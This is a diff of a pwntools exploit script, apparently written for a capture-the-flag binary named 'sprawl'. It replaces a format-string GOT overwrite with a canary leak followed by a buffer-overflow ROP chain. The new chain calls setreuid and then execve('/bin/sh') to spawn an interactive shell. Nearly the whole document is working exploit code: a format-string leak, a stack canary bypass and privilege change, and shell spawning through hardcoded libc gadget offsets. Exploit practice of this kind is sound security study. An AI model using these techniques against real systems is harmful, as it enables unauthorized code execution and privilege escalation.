@@ -1,25 +1,52 @@
-# 0x404018 <printf@got.plt>:    0x00007ffff7c60100  0x0000000000401070
-# Canary inside the format string %23$p
-# AAAAAAAA = 7 in the format string
 from pwn import *
 
-# System 0x7ffff7c58750
-# Libc = 0x7ffff7c00000
-
-#low_got = 0x404018
-#next_got = low_got + 2
-
-printfgot = 0x404018
 libc = 0x7ffff7c00000
-system = libc + 0x58750
+offset = 254
+ret = libc + 0x28a92
+pop_rdi = libc + 0x10c08d
+pop_rsi = libc + 0x10f889
+pop_rdx = libc + 0xb513c
+addr_execve = libc + 0xef030
+addr_exit = libc + 0x47ba0
+addr_shell = libc + 0x1cc42f
+addr_setreuid = libc + 0xd27370
 
-context.binary = './sprawl'
 p = process('./sprawl')
 
-payload = fmtstr_payload(6, {printfgot : system})
-payload += b'/bin/sh\x00'
-p.sendlineafter(b'Route tag: ', payload)
-print(len(payload))
-#payload = b'%6$p'
-#payload += p64(low_got) + p64(low_got + 2)
-#p.sendlineafter(b'Route tag: ', payload)
+p.sendlineafter(b'[SPRAWL] Route tag: ', b'%23$p')
+p.recvuntil(b'[SPRAWL] Routing via ')
+data = p.recvuntil(b'[SPRAWL] Header (hex): ')
+leak_line = data.split(b'\n')[0]
+canary = int(leak_line, 16)
+p.sendline(b'deadbeef 0100 0000')
+
+payload  = b'A' * offset
+payload += p64(canary)
+payload += b'B' * 8
+payload += p64(ret)
+
+# setreuid(1024, 1024)
+payload += p64(pop_rdi)
+payload += p64(1024)
+payload += p64(pop_rsi)
+payload += p64(1024)
+payload += p64(0)
+payload += p64(addr_setreuid)
+
+# execve("/bin/sh", NULL, NULL)
+payload += p64(pop_rdi)
+payload += p64(addr_shell)
+payload += p64(pop_rsi)
+payload += p64(0)
+payload += p64(0)
+payload += p64(pop_rdx)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(addr_execve)
+payload += p64(addr_exit)
+
+p.sendlineafter(b'[SPRAWL] Transmit (0 bytes): ', payload)
+p.interactive()
